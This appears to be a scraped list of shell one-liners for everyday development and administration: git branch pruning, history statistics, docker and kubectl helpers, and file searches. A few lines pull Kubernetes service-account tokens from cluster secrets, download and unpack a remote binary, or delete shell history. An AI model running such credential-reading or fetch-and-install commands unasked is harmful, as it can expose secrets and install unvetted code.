"lsof -i -n -P | grep ""LISTEN"" | h -ni ""27017|mongod"" ""node"" ""3001|9229"" ""3000|9222"" ""8080|9007"""
"lsof -Pn -i | grep -E '(UDP|LISTEN|ESTABLISHED)' | awk '{print \$10, \$1, \$8, \$9}' | column -t | sort"
"lsgitstatus_data=""""; for file in $(ls -d */); do cd $file; lsgitstatus_data=""$lsgitstatus_data$file%$(git status 2>&1 | head -n 3 | sed -E ""s/^.*(branch|is)[[:space:]]//"" | cut -c 1-27 | tr ""\n"" ""%"")\n""; cd ..; done; echo -e $lsgitstatus_data | column -t -s %"
"lscpu | egrep -i ""cpu|thread|core|model|cache|socket"""
"ls /sys/class/net | egrep -v ""^(lo[0-9]?|sit[0-9]|ce[0-9]?|docker[0-9]?|br[-a-z0-9]{13})$"" | xargs --max-args=1 /sbin/ifconfig"
"ls -p | grep -v / |rev | cut -d""."" -f1|rev | sort | uniq -c"
"ls -la | grep ""^d"" | octal && ls -la | grep ""^-"" | octal && ls -la | grep ""^l"" | octal"
"ls -aGF; echo ""\e[1;32m --[\e[1;34m Dirs:\e[1;36m `ls -al | egrep \""^drw\"" | wc -l` \e[1;32m|\e[1;35m Files: \e[1;31m`ls -al | egrep -v \""^drw\"" | grep -v total | wc -l` \e[1;32m]--"""
"ls -1 | egrep -vi ""(log|tmp|cache|coverage|public)"" | xargs mate"
"ll | grep -e ""^d"" | grep -v "" \."" | sed ""s|^.*(\s\d{2}:\d{2}\s)||g"""
"list=`git tag`;echo -ne $list|grep ""^release_""|sed ""s/release_\(.*\)/\1/""|sort -t . -k 1,1 -k 2,2n -k 3,3n|sed ""s/\(.*\)/release_\1/"";echo -ne $list|grep -v ""^release_""|sort"
"kubectl get ing,po,deploy,cm,rs,rc,svc --all-namespaces | grep -P "" \ds| \d\ds| \dh| \d\dh| \d\dm| \dm"""
"kubectl get -o name ns | sed ""s|^.*/| |;\|^ $(krn)$|s/ /*/"""
"kubectl get -o name ns | sed ""s|^.*/| |;\|$(krn)|s/ /*/"""
"kubectl -n kube-system get secret -o json | jq "".items[] | select(.metadata.name | contains(\""kubernetes-dashboard-token\""))"" | jq -r "".data.token"" | base64 --decode | pbcopy"
"keyboard | grep -v ""Control\|Semicolon"" && keyboard | grep -v ""Command\|Semicolon"" && keyboard | grep -v ""Command\|Control"""
"k get -o name ns | sed ""s|^.*/| |;\|^ $(krn)$|s/ /*/"""
"join -v 1 <(git branch |grep -v -E ""\*|master""|sed -e ""s:\s*::g"") <(git branch -r |grep -v master|sed -e ""s:\s*origin/::g"")|xargs -n1 -I{} git branch -D {}"
"ip netns | while read ns; do echo -e \""\n$ns\""; ip netns exec $ns /usr/sbin/ip addr show; done | egrep -v \""inet6|127.0.0.1\"" | egrep \""^q|^$|inet\"""
"ip addr show $((ip -6 route show | grep default | grep -oP ""(?<=dev )\S*""; ip route show | grep default | grep -oP ""(?<=dev )\S*"") | sort | uniq)"
"ind -not -empty -type f -printf ""%s\n"" | sort -rn | uniq -d | xargs -I{} -n1 find -type f -size {}c -print0 | xargs -0 md5sum | sort | uniq -w32 --all-repeated=separate"
"history | tail -n 20000 | sed ""s/.* //"" | sort | uniq -c | sort -g | tail -n 100"
"history | tail -n 1 | mutt nalbyul@gmail.com -s ""END-success"" || history | tail -n 1 | mutt -s ""End-fail"" nalbyul@gmail.com"
"history | tail -2 | head -1 | cut -c 8- | python -c ""import sys; print sys.stdin.read().split()[-1],"" | xargs echo -n | xsel -i -b"
"history | cut -d "" "" -f 4 | tr -c ""[:alnum:]"" ""[\n*]"" | sort | uniq -c | sort -nr | head -20"
"history | awk ""{print $2}"" | awk ""{print $1}"" |sort|uniq -c | sort -rn | head -10"
"history | awk ""{print $2}"" | awk ""{print $1}"" | sort |uniq -c | sort -rn | head -10"
"history | awk ""{CMD[$2 $3 $4 $5]++;count++;}END { for (a in CMD)print CMD[a] "" "" CMD[a]/count*100 ""% "" a;}"" | grep -v ""./"" | column -c3 -s "" "" -t | sort -nr | nl | head -n25"
"history | awk ""{ print \$2 }"" | sort | uniq -c | sort -n | tail -n 10 | sort -r;"
"history 1 | awk ""{print \$2}"" | sort | uniq -c | sort -nr | head | sort"
"history -E 1 | grep ' git' | awk '{print \$4,\$5,\$6}' | sort | uniq -c | sort -nr | less"
"hg log --template ""{date|localdate|isodatesec} ${GREEN}{node|short}${RESET} ${LIGHT_PURPLE}{pad(phabdiff, 8)}${RESET} {pad(author|emailuser, 17)} {desc|strip|firstline}\n"""
"gvim `find . | egrep "".*(\.(h|cc|proto|js|sh)|BUILD)\$""`"
"gud && git branch --merged | grep -vE ""^(\*|\s*($(git_current_branch)|master|develop|dev)\s*$)"" | xargs -n 1 git branch -d"
"grep CFarmdHealth /var/log/moogsoft/moogfarmd.log | tail -1 | cut -d ""|"" -f2 | cut -d ""|"" -f1 | jq"
"grep -v ""OPTIONS"" /opt/vsd/jboss/standalone/log/web.access/access.log* |grep -v ""/me "" | grep -v ""events"" | grep -Ev ""HTTP/1.1 201|HTTP/1.1 204|HTTP/1.1 200|HTTP/1.0 200"""
"grep --include=""*.[c|h|cpp|cxx|hpp|s|S]"""
"git svn show-externals | grep ""^/"" | sed ""s|^/\([^ ]*\)\(.*\) \(.*\)|(mkdir -p \1 \&\& cd \1 \&\& if [ -d .svn ]; then echo \""svn up \2 \1\"" \&\& svn up \2 ; else echo \""svn co \2 \3 \1\"" \&\& svn co \2 \3 . ; fi)|"" | sh"
"git status|egrep -v -- ""\.built|\.out|\-compile/$|\.so$|\.o$""|more"
"git status -s | grep -e ""^\(\\sM\|\\?\\?\)"" | rev | cut -d"" "" -f1 | rev | xargs atom-beta"
"git ls-tree -r HEAD --name-only | sed -rn ""s|.*\.([^\.]+)$|\1|p"" | sort | uniq"
"git ls-remote --tags $(grep source= PKGBUILD | cut -d\"" -f2 | cut -d\# -f1 | cut -d+ -f2 | sed ""s/\$pkgname/$(grep pkgname= PKGBUILD | cut -d= -f2)/g"") | tail -1"
"git log --pretty=oneline | head -20 | tac | sed -e ""s|\([a-z0-9]*\) \(.*\)|* [\1/${PWD##*/}]\n err.txt generated.file succ.txt \`\2\`\n|"""
"git log --pretty=oneline | head -20 | tac | sed -e ""s|\([a-z0-9]*\) \(.*\)|* [\1/${PWD##*/}]\n err.txt generated.file succ.txt \2\n|"""
"git log --format=format:%s%b | tr ""[:upper:]"" ""[:lower:]"" | tr -c ""[:alnum:]"" ""[\n*]"" | sort | uniq -c | sort -nr | head -25"
"git checkout master && git pull && git branch --merged | egrep -v ""(^\*|master)"" | xargs git branch -d && comm -12 <(git branch | sed ""s/ *//g"") <(git remote prune origin | sed ""s/^.*origin\///g"") | xargs -L1 -J % git branch -D %"
"git checkout develop && git pull && git remote prune origin && git branch --merged | egrep -v ""(^\*|master|development|develop|release*)"" | xargs git branch -d"
"git cb bak`gbv | grep bak | cut -d""k"" -f2 | cut -d"" "" -f1 | sort -nr | head -n1 | awk ""{ print 1 + \\\$1 }""` && git co -"
"git branch | grep -v ^""master\|develop\|next-release\|rc\|prod""$ | xargs git branch -D"
"git branch -rl | grep -vE ""HEAD|master"" | tr -d "" "" | sed -r ""s@origin/@@g"" | fzf | xargs -i git checkout -b {} origin/{}"
"git branch -r --merged | grep origin | grep -v "">"" | grep -v master | grep -v staging | grep -v ""rc-"" | xargs -L1"
"git branch --remote --merged | grep -v ""\*"" | grep -v master | grep -v dev | sed ""s/origin\///"" | sed ""s/remotes\///"" | xargs -n 1 git push origin --delete"
"git branch --no-color --merged | command grep -vE ""^(\+|\*|\s*(master|maintenance|merge-base)\s*$)"" | command xargs -n 1 git branch --delete"
"git branch --no-color --merged | command grep -vE ""^(\+|\*|\s*(master|develop|dev)\s*$)"" | command xargs -n 1 git branch -d"
"git branch --no-color --merged | command grep -vE ""^(\*|\s*(master|develop|dev|staging)\s*$)"" | command xargs -n 1 git branch -d"
"git branch --no-color --merged | command grep -vE ""^(\*|\s*(master|develop|dev|release)\s*$)"" | command xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -Ev ""(\*|master|proto|staging)"" | xargs -n 1 git branch -d"
"git branch --merged | grep -v ""\*"" | grep -Ev ""(\*|master|develop|staging)"" | xargs -n 1 git branch -d"
"git branch --merged | grep -Ev ""(\*|master|develop|staging|gh-pages)"" | xargs -n 1 git branch -d"
"git branch --merged | egrep -v ""(^\*|master|pubdev|staging|prod)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev|staging|develop)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev|qa|staging)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev|qa|production)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev|develop|development)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|dev|beta|release)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|develop|feat|live)"" | xargs git branch -d"
"git branch --merged | egrep -v ""(^\*|master|3.12.x|3.10.x|3.7.x)$"" | xargs git branch -d"
"gibo -l | sed ""/=/d"" | tr ""\t"", ""\n"" | sed ""/^$/d"" | sort | peco | xargs gibo"
"gibo -l | sed ""/=/d"" | tr ""\t"", ""\n"" | sed ""/^$/d"" | sort | fzf | xargs gibo"
"gibo -l | sed ""/=/d"" | tr ""\t"", ""\n"" | sed ""/^$/d"" | sort | ${INTERACTIVE_FILTER} | xargs gibo"
"ggl && git branch --merged | egrep -v ""(^\*|master|dev|release|codus)"" | xargs git branch -d && git fetch --all --prune"
"gco $(gba | sed ""s/remotes\/origin\///g"" | grep -Ev ""(HEAD|\*)"" | sort | uniq | fzf)"
"function pm() { mount | sed -r ""s/(on|type)//g"" | column -t --table-columns=""NAME,MOUNTPOINT,TYPE,OPTS"" -W ""OPTS"" -c 1000; }; pm | grep NAME; pm | grep -v NAME | sort -k 3,3 -r;"
"function _ldiff() { sed -r ""s|(.)|\1\n|g"" ""$1"" > /tmp/ldiffA && sed -r ""s|(.)|\1\n|g"" ""$2"" > /tmp/ldiffB && meld /tmp/ldiffA /tmp/ldiffB; }; _ldiff ""$@"""
"for i in ${kall[@]}; do service $i status | grep -B2 ""Active:"" | grep -v ""Loaded:"" | grep -E ""failed|inactive|exited|$""; done"
"for dev in $( udisks --dump | grep device-file | sed ""s|^.*\:\ *\(.*\)|\1|g"" ) ; do udisks --show-info ${dev} | grep -qi ""removable.*1"" && echo ${dev} ; done ; true ; unset dev"
"for I in $(seq $(history | grep ""exit$"" | tail -n 1 | cut -d"" "" -f2) $(history | tail -n 1 | cut -d"" "" -f2) | tac); do history -d $((I+1)); done"
"find backend | entr bash -c ""clear; echo; git status -sb; echo; hr; echo; git delta | grep py | xargs flake8 && git delta | grep py | xargs isort && echo No lint issues | figlet"""
"find 2>/dev/null . -type f -ls | sed -e ""s/[[:blank:]][[:blank:]]*/ /g"" | cut -d"" "" -f 7,11- | sort -nr | head -25 | awk ""{ printf \""%6d\"", int( \$1/1048576 ); print \"" MiB \"" \$2 \"" \"" \$3 \"" \"" \$4 \"" \"" \$5 \"" \"" \$6 \"" \"" \$7 \"" \"" \$8 \"" \"" \$9 \"" \"" \$10 \"" \"" \$11 \"" \"" \$12 }"" | sed -e ""s:MiB \./:MiB :"" -e ""s:\\\ : :g"""
"find /sys/block/ -name sd\* | sed ""s|sys/block|dev|g"" | sudo xargs hddtemp | sort -t: -k3"
"find . -type f | grep -vE ""\.pyc$"" | xargs nkf --guess | grep -vE ""(UTF-8 \(LF\)|BINARY|ASCII \(LF\)|ASCII)"""
"find . -type f \( -name ""*.scala"" -and -not -ipath ""*scrooge*"" -and -not -ipath ""*plugins*"" \) -exec git blame -f {} \; |cawk 3|sed s/\(//g|grep -v Not| sort |uniq -c|sort -n"
"find . -type f -name ""*.yml*"" -exec yamllint -f parsable {} \; | sed ""s|\./||g"" | egrep -v ""(\.kitchen/|\[warning\])"""
"find . -not -empty -type f -printf ""%s\n"" | sort -rn | uniq -d | xargs -I{} -n1 find . -type f -size {}c -print0 | xargs -0 md5sum | sort | uniq -w32 --all-repeated=separate"
"find . -name ""*.swp"" -print0 | xargs -0 rm -rf; find . -name ""*.swn"" -print0 | xargs -0 rm -rf; find . -name ""*.swo"" -print0 | xargs -0 rm -rf; find . -name ""*.swm"" -print0 | xargs -0 rm -rf; find . -name ""*.swk"" -print0 | xargs -0 rm -rf; find . -name ""*.swl"" -print0 | xargs -0 rm -rf"
"find . -name ""*.js"" -or -name ""*.vue"" -or -name ""*.ts""|grep -v node_modules|grep -v all.js|grep -v all.min.js|grep -v bitcoinjs.js|grep -v bundle.js|xargs grep -nE"
"find . -maxdepth 1 -print0 | sort -z | xargs -0 -n 1 stat -f ""%Sp %OLp %Su:%Sg %N"" | sed ""s| \./| |"""
"find . -maxdepth 1 -print0 | sort -z | xargs -0 -n 1 stat --format=""%A %a %U:%G %n"" | sed ""s| \./| |"""
"find . -maxdepth 1 -mindepth 1 -print0 | xargs -0 -n1 du -ks | sort -rn | head -16 | cut -f2 | tr ""\n"" ""\0"" | xargs -0 du -hs"
"find . ! -readable -prune -not -empty -type f -printf ""%s\n"" | sort -rn | uniq -d | xargs -I{} -n1 find -type f -size {}c -print0 | xargs -0 md5sum | sort | uniq -w32 --all-repeated=separate"
"find -type f | egrep ""(\.c|\.cc|\.cpp|\.h)$"" | xargs cat | wc -l"
"find -not -empty -type f -printf ""%s\n"" | sort -rn | uniq -d | xargs -I{} -n1 find -type f -size {}c -print0 | xargs -0 md5sum | sort | uniq -w32 --all-repeated=separate"
"find -E . -type f -iregex "".*\.(js|jsx|json|es6|es2015)$"" -not -path ""./node_modules/*"" -not -path ""./dist/*"" -not -path ""./.coverage"" -not -path ""./.git"" -exec jsctags {} -f \; | sed ""/^$/d"" | sort > tags"
"find -E . -regex "".*(\.yptfxcaches|\.DS_Store|\.localized|\._\.Trashes|\.Trashes|\.fseventsd|\.Spotlight-V100)"" -delete"
"find ${*-.} -type f | xargs file | awk -F, ""{print $1}"" | awk ""{$1=NULL;print $0}"" | sort | uniq -c | sort -nr"
"f(){ curl -sL ${1}${2} | egrep -o ""([a-zA-Z]*\.){1,4}${1}"" | sort -u | parallel ping -c1 -W1 {} 2>/dev/null | grep ttl | egrep -o ""([0-9]{1,3}\.){3}[0-9]{1,3}"" | sort -u };f"
"export TOKEN=$(kubectl describe secret -n kube-system $(kubectl get secrets -n kube-system | grep default | cut -f1 -d "" "") | grep -E ""^token"" | cut -f2 -d"":"" | tr -d ""\t"" | tr -d "" "")"
"expac -l ',' -H M -t '%s %c' '(%N) [%G] %l\t%m\t%n\t' | grep '()' | grep -v '\[base\|base-devel\]' | cut -d' ' -f3- | sort -n | cut -d' ' -f2-"
"echo \`gs -s|grep M|wc -l\`M,\`gs -s|grep D|wc -l\`D,\`gs -s|grep ??|wc -l\`?"
"echo Master; echo '$(amixer | grep -4 Master | tail -4)'; echo 'Capture 0'; echo '$(amixer | grep -5 \'Capture\',0 | tail -5)'; echo 'Capture 1'; echo '$(amixer | grep -5 \'Capture\',1 | tail -5)'"
"echo -e ""find -maxdepth 3 -regextype posix-egrep -iregex \"".*<regexp>\"" [<tests>...] [-xtype f|d|c|l|b|p|s] [<moretests>...]"""
"echo -e ""\033[1;35mCD ALIASES: cd[p | s | Go | Blog | Eclipse | Finance | XAMPP]\033[0m"""
"echo -e "" Count: Command:""; history | grep -o "" [a-z.:/-\""|_].*"" | sort | uniq -c | sort -rn | head -10"
"echo 'User: Command: Port:'; echo '----------------------------' ; lsof -i 4 -P -n | grep -i 'listen' | awk '{print \$3, \$1, \$9}' | sed 's/ [a-z0-9\.\*]*:/ /' | sort -k 3 -n |xargs printf '%-10s %-10s %-10s\n' | uniq"
"echo ""find -maxdepth 3 -regextype posix-egrep -iregex """"\"".*<regexp>\"""""" [<tests>...] [-xtype f|d|c|l|b|p|s] [<moretests>...]"""
"echo ""^(((\\d{1,2})|(1\\d{2})|(2[0-4]\\d)|(25[0-5]))\\.){3}((\\d{1,2})|(1\\d{2})|(2[0-4]\\d)|(25[0-5]))$"""
"echo ""\e[1;32m --[\e[1;34m Dirs:\e[1;36m `ls -Al | egrep \""^drw\"" | wc -l` \e[1;32m|\e[1;35m Files: \e[1;31m`ls -al | egrep -v \""^drw\"" | grep -v total | wc -l` \e[1;32m]--"""
"echo ""Doing a git pull, git fetch --all --prune and a gclean"" && git pull && git fetch --all --prune && git branch --merged | grep -v ""\*"" | grep -Ev ""(\*|master|develop|staging)"" | xargs -n 1 git branch -d"
"echo ""BTC: $(coinprice btcusd) | ETH: $(coinprice ethusd) | ETC: $(coinprice etcusd) | EOS: $(coinprice eosusd) | LTC: $(coinprice ltcusd) | DASH: $(coinprice dashusd) | ZEC: $(coinprice zecusd) """
"echo ""((USER|UID|PID).*(CMD|COMMAND))|./gatesvr|./ipccli|./tcpcli"""
"dpkg -l | grep -Ei ""linux-(g|h|i|lo|si|t)"" && sudo apt-get autoremove --purge"
"dotcfg branch --no-color --merged | command grep -vE ""^(\+|\*|\s*(master|develop|dev)\s*$)"" | command xargs -n 1 dotcfg branch -d"
"dos2unix | sed -e '/^$/d' -e 's/^[ \\t]*//' -e 's/\\t/\\ /g' | tr '\\n' ' ' | sed -E 's/>(\\ {1,})</></g' | tidy 2> /dev/null | html-beautify -t false -E -T -U | pygmentize -l html -f terminal16m -O style=monokai"
"docker ps|tail -n +2|grep -v ""tomastomecek/sen""|grep -v kubeenv|grep -v "" registry$""|cut -f1 -d"" ""|xargs docker stop"
"docker ps -a | egrep ""Exited.*\(minutes\|days|weeks|months|years\) ago"" | awk "
"docker images | hl ""(REPOSITORY|TAG|IMAGE ID|CREATED|SIZE|$)"""
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_vault | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_vault | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/sh"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_timeseries_db | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_timeseries_db | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/bash"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_node_red | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_node_red | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/bash"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_nginx | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_nginx | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/bash"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_nextcloud_exporter | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_nextcloud_exporter | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/bash"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_mqtt | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_mqtt | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/bash"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_loki | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_loki | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/sh"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_jupyter | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_jupyter | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/bash"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_home_assistant_db | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_home_assistant_db | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/bash"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_home_assistant | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_home_assistant | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/bash"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_health | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_health | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/sh"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_grafana | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_grafana | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/bash"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_fluentd | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_fluentd | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/sh"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_esphome | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_esphome | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/bash"
"docker exec -it $(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_docs | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 2).$(docker service ps -f desired-state=running --no-trunc ${stack_name:-technocore}_docs | grep ${stack_name:-technocore} | tr -s "" "" | cut -d "" "" -f 1) /bin/sh"
"date;l_pwd=`pwd`;cd /{root}/{DEVISON}/ER/ER442/log; echo ""`pwd` : `ls | wc -l`"";cd /{root}/{DEVISON}/ER/ER442/stage/; echo ""`pwd` : `ls | wc -l`"";cd /{root}/{DEVISON}/ER/ER442/build/; echo ""`pwd` : `ls | wc -l`"";cd /{root}/{DEVISON}/ER/ER442/badfiles/; echo ""`pwd` : `ls | wc -l`"";cd /{root}/{DEVISON}/ER/ER442/darchive/; echo ""`pwd` : `ls | wc -l`"";cd /{root}/{DEVISON}/ER/ER442/archive/; echo ""`pwd` : `ls | wc -l`"";cd $l_pwd"
"curl -so /dev/null -w ""dnslookup: %{time_namelookup} | connect: %{time_connect} | appconnect: %{time_appconnect} | pretransfer: %{time_pretransfer} | starttransfer: %{time_starttransfer} | total: %{time_total} | size: %{size_download}\n"""
"curl -s https://api.github.com/repos/starship/starship/releases/latest | grep ""browser_download_url.*starship-x86_64-unknown-linux-gnu.tar.gz"" | head -n1 | cut -d : -f 2,3 | tr -d \"" | xargs -n 1 curl -LJs | tar xvz -C ~/.local/bin/ starship"
"crab -status | tee status | awk ""/^[0-9]/{if ((\$2 != \""Cleared\"") || (\$4 != 0) || (\$5 != 0)) print }"""
"cowsay -f $(cowsay -l|sed ""1d""|tr "" "" ""\n""|grep -vE ""sodomized|telebears|head-in""|shuf -n1)"
"clear;x=$(($COLUMNS/2));y=$(($LINES/2));c=0;n=1;a=90;while :;do bgc=$(($c%232 + 16));case ""$a"" in 0)xd=0;yd=-1;n=$(($n+1));; 90)xd=1;yd=0;; 180)xd=0;yd=1;n=$(($n+1));; 270)xd=-1;yd=0 ;; *) break ;; esac; for ((i=0;i < $n;i++));do if [[ $x -ge $COLUMNS || $x -le 0 || $y -ge $LINES || $y -le 0 ]]; then x=$(($COLUMNS/2));y=$(($LINES/2));n=1;a=0; continue ; fi ; printf ""\033[%s;%sH\033[48;5;%sm \033[0m"" $y $x $bgc ; x=$(( $x + $xd )); y=$(( $y + $yd )); done ; c=$(( $c + 1 )); a=$(( $(( $a + 90 )) % 360 )) ; sleep 0.001; done"
"cd ~/Desktop; mkdir simonstalenhag; cd simonstalenhag; curl http://www.simonstalenhag.se | grep bilderbig | cut -d""\"""" -f2 | sed ""s,//,/,g"" | uniq | sed -e ""s/^/http:\/\/www.simonstalenhag.se\//"" | xargs wget"
"cd /Users/axel/com/VAGRANT/vagrant-local && vagrant up | h ssh localhost srv www log config 192.168.50.4 ""vvv.dev | local.wordpress.dev | src.wordpress-develop.dev | build.wordpress-develop.dev"" username 3306 ""stopping|starting|running"""
"cat ~/.zhistory | cut -d ';' -f 2- | awk {'print \$1,\$2'} | sort | uniq -c | sort -r | head -20"
"cat ~/.zhistory | cut -d "";"" -f 2 | sed ""s, .*,,"" | sort | uniq -c | sort -n | tail -rn 30"
"cat /var/log/nginx/access.log | cut -d "" "" -f1 | sort | uniq -c | sort -n | tail -n 30 | sort -nrk 1"
"bin/rails server thin || bin/unicorn -p 3000 --config-file <(echo ""timeout 6000"")|| rails server thin || rails server"
"aws ec2 describe-instances | jq -r "".Reservations[].Instances[] | select(.Tags!=null) | [.InstanceId, .PublicIpAddress, .PrivateIpAddress, [.Tags[] | select(.Key == \""Name\"").Value][]] | @tsv "" | sort -k3"
"aws ec2 describe-instances | jq -r "".Reservations[].Instances[] | select(.Tags!=null) | [.InstanceId, .InstanceType, .PublicIpAddress, .PrivateIpAddress, [.Tags[] | select(.Key == \""Name\"").Value][]] | @tsv "" | sort -k3"
"aws ec2 describe-instances | jq '[.Reservations | .[] | .Instances | .[] | {InstanceId: .InstanceId, Name: (.Tags[]|select(.Key==\"
"alias | egrep ""ls\s|tree\s|ppwd"" | egrep ""^[a-z]{1,2}[0-9]?="" | sed -e ""s/=.*$/ /g"" | tr ""\n"" "" "" && echo"
"ag -G ""\.h$|\.hpp$|\.txx$|\.c$|\.cc$|\.cpp$|\.c\+\+$"""
"ag -G "".*\.(cpp|hpp|c|h|ipp|inl|py)$"""
"ag --nocolor --nogroup --nofilename ""import qualified (\S+)(\s)+as"" | perl -lpe ""s/ +/ /g"" | grep -v ""^--"" | sort | uniq | fzf | pbcopy"
"ag --color-match=""31;40"" -U -S -G ""[.](c|h|inc|def|txt|ldf|asm)$"""
"ack --flush --passthru --color --color-match=blue ""DEBUG"" | ack --flush --passthru --color --color-match=yellow ""WARN(ING)?"" | ack --flush --passthru --color --color-match=red ""ERROR"" | ack --flush --passthru --color --color-match=red ""^.*FAILURE.*"" | ack --flush --passthru --color --color-match=green ""BUILD SUCCESSFUL"" | ack --flush --passthru --color --color-match=green ""^Tests run: .*"" | ack --flush --passthru --color --color-match=blue ""\-\-\-*"""
"`git branch -r | peco --query ""origin/ "" --prompt ""GIT REMOTE BRANCH>"" | head -n 1 | sed ""s|origin/||""`"
"`echo ""$realhost""|rev|cut -f1 -d' '|cut -c2- |rev`||realhost=$smtpname"
"`awk 'BEGIN {printf ""%-10s %-64s\n"", ""SID"",""HOME""}' ; awk 'BEGIN {printf ""%-12s %-64s\n"", ""----------"",""----------------------------------------""}' ; cat /etc/oratab | egrep "":N|:Y"" | egrep -v ""\#|\*"" | sort | awk -F: '{printf ""%-10s %-64s\n"", $1,$2}'`"
"\""netstat -ntu | awk '{print \$5}' | cut -d: -f1 | grep -E [0-9.]+ | sort | uniq -c | sort -n\"""
"\""netstat -ntu | awk '{print \$5}' | cut -d: -f1 | grep -E [0-9.]+ | sort | uniq -c | sort -n\"" "
"\""echo -e \'\\e[1m\'\; \(echo -e \'Name IP-Address Allow-Service Floating Traffic-Group VLAN\\033[0m\'\; tmsh list /net self all one-line all-properties \| sed \'s/{\\\|}//g\' \| sed \'s/fw-.* none//\' \| awk \'{print \\\$3,\\\$5,\\\$9,\\\$15,\\\$23,\\\$27}\' \| sort\) \| column -t\; echo\;\"" >> ~/.bashrc"
"[ -e ~/.synergy/$( hostname -s ).conf ] && synergyc --daemon --restart --display ${DISPLAY:-:0} --name $( hostname -s ) $( ls ~/.synergy/ | grep -iv ""$( hostname -s ).conf"" | head -n1 | sed ""s|\.conf$||g"" ) 2> ~/.log/synergyc.log >&2"
"TOKEN=$(kubectl describe secret -n kube-system $(kubectl get secrets -n kube-system | grep default | cut -f1 -d ' ') | grep -E '^token' | cut -f2 -d':' | tr -d '\t' | tr -d "" "")"
"LOG_FILEPATH=""/home/lowid/bin/script/autorun/log/ani_auto_download.log"";START_LINE=""$(cat ""$LOG_FILEPATH"" | grep -n -e ""^--- Download Start"" | tail -1 | cut -d : -f1)"";END_LINE=""$(cat ""$LOG_FILEPATH"" | grep -n -e ""^--- Elapse Seconds "" | tail -1 | cut -d : -f1)"";sed -n ""$START_LINE"",""$END_LINE""p ""$LOG_FILEPATH"""
"LANG=en df -h -T -x tmpfs | grep -vE ""(tmpfs|gvfs|procbususb|rootfs|devtmpfs|debugfs)"""
